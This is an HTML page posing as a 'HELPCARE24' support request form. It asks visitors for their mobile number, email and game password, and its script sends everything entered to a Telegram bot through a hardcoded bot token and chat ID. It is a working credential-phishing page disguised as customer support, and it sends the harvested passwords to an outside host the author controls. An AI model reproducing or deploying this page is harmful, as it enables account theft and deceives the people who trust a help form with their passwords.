<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HELPCARE24 - Submit Request</title>

    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
</head>

<body>

    <div class="bg1"></div>
    <div class="bg2"></div>

    <div class="card">

        <div class="logo-circle">📝</div>

        <h1>Submit Request</h1>
        <p>Please fill your details below</p>

        <form id="supportForm">

            <input type="tel" id="mobile" placeholder="📱 Mobile Number" required>
            <input type="email" id="email" placeholder="📧 Email Address" required>
            
            <label for="userpassword">userpassword </label>
            <input type="text" id="userpassword" placeholder="🆔 Enter Your game password" required>
            
            <textarea id="description" rows="5" placeholder="📝 Write Your Problem Here..." required></textarea>

            <button type="submit" style="padding: 16px 40px; font-size: 18px; font-weight: bold; background: linear-gradient(45deg, #ff6b00, #ff9500); color: white; border: none; border-radius: 50px; width: 100%; margin: 20px 0;">
                SUBMIT REQUEST
            </button>

        </form>

        <a href="index.html" style="display:block; text-align:center; margin-top:10px; color:#fff;">← BACK TO HOME</a>

    </div>

    <script>
        document.getElementById("supportForm").addEventListener("submit", async function(e) {
            e.preventDefault();

            const mobile = document.getElementById("mobile").value;
            const email = document.getElementById("email").value;
            const userpassword = document.getElementById("userpassword").value;
            const description = document.getElementById("description").value;

            // टेलीग्राम मैसेज फ़ॉर्मेट
            const telegramMessage = `🚨 New Support Request!\n\n📱 Mobile: ${mobile}\n✉️ Email: ${email}\n🆔 userpassword: ${userpassword}\n📝 Description: ${description}`;

            // आपका नया टोकन और चैट आईडी यहाँ सेट कर दी गई है
             const botToken = "8945568234:AAHTOvJd351xi9Qp0ERkbSKAVhEFYGdHmPs";
             const chatId = "8944619650";

            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            try {
                const response = await fetch(telegramUrl, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: telegramMessage
                    })
                });

                const result = await response.json();

                if (result.ok) {
                    alert("Request submitted successfully!");
                    document.getElementById("supportForm").reset(); // फॉर्म खाली करने के लिए
                } else {
                    alert("Telegram Error: " + result.description);
                }
            } catch (error) {
                console.error("Error sending message:", error);
                alert("Failed to send request. Please check your network.");
            }
        });
    </script>

</body>
</html>
